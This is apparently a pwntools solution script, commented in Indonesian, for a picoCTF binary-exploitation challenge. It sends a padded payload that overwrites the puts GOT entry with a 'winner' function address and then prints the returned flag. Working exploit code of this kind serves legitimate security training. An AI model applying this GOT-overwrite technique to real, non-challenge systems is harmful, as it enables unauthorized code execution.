#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Ganti port dengan instance terbaru
r = remote('foggy-cliff.picoctf.net', 53823)   # <-- PORT TERBARU

ALAMAT_WINNER  = 0x080492b6
ALAMAT_GOT_PUTS = 0x0804c028   # dari objdump -R

# Payload arg1: 20 byte padding + alamat GOT puts sebagai buf2
payload = b'A' * 20 + p32(ALAMAT_GOT_PUTS)

# arg2: alamat winner (4 byte)
arg2 = p32(ALAMAT_WINNER)

# Terima prompt, kirim payload spasi arg2
r.recvuntil(b'Enter two names separated by space:')
r.sendline(payload + b' ' + arg2)

# Baca flag
print(r.recvall(timeout=3).decode(errors='ignore'))
